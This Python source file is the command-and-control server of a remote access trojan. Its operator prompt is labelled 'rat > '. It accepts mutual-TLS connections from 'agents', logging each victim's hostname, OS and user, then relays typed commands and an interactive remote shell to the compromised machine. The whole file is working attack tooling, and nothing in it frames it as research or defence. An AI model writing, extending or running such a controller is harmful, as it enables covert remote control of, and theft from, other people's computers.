import socket
import ssl
from threading import Thread
from utils.logger import setup_logger
import json

logger = setup_logger()


class SSLServer:
    def __init__(self, host, port, server_cert, server_key, client_cert, chunk_size=1024):
        self.host = host
        self.port = port
        self.chunk_size = chunk_size

        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)

    # -------------------------
    # CONNECTION HANDLING
    # -------------------------
    def connect(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
            sock.bind((self.host, self.port))
            sock.listen(5)

            print("Server listening")
            logger.info("Server listening")

            while True:
                conn, addr = sock.accept()

                try:
                    sconn = self._context.wrap_socket(conn, server_side=True)

                    print("Client connected:", addr[0])
                    logger.info("Client connected: %s", addr[0])

                    # handshake
                    data = self._recv_until_eof(sconn)
                    client_info = json.loads(data)

                    logger.info(
                        "New agent: %s | %s | %s | %s",
                        client_info["hostname"],
                        client_info["os"],
                        client_info["user"],
                        client_info["release"],
                    )

                    Thread(
                        target=self._handle_client,
                        args=(sconn,),
                        daemon=True,
                    ).start()

                except ssl.SSLError:
                    print("SSL handshake failed")
                    logger.error("SSL handshake failed")

    # -------------------------
    # UNIFIED RECEIVE
    # -------------------------
    def _recv_until_eof(self, sock):
        buffer = ""

        while True:
            chunk = sock.recv(self.chunk_size)

            if not chunk:
                return None

            buffer += chunk.decode(errors="ignore")

            if "\nEOF" in buffer:
                message, _ = buffer.split("\nEOF", 1)
                return message.strip()

    # -------------------------
    # CLIENT HANDLER
    # -------------------------
    def _handle_client(self, sock):
        logger.info("Client handler started")

        try:
            while True:
                command = input("rat > ")

                if not command:
                    continue

                # ✅ ALWAYS use same protocol
                sock.sendall((command + "\nEOF").encode())

                logger.info("Server sent command: %s", command)

                # -------------------------
                # INTERACTIVE SHELL (LOGIC ONLY)
                # -------------------------
                if command.strip() == "shell":

                    response = self._recv_until_eof(sock)
                    print(response)

                    while True:
                        cmd = input("shell> ")

                        sock.sendall((cmd + "\nEOF").encode())

                        if cmd.strip().lower() in ["exit", "quit"]:
                            break

                        response = self._recv_until_eof(sock)

                        if not response:
                            print("Client disconnected")
                            return

                        print(response)

                    continue

                # -------------------------
                # NORMAL COMMAND MODE
                # -------------------------
                response = self._recv_until_eof(sock)

                if not response:
                    logger.warning("Client disconnected")
                    break

                print(response)
                logger.info("Client responded: %s", response)

        except Exception as e:
            logger.error("Client handler error: %s", e)

        finally:
            logger.info("Closing client socket")
            sock.close()


class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()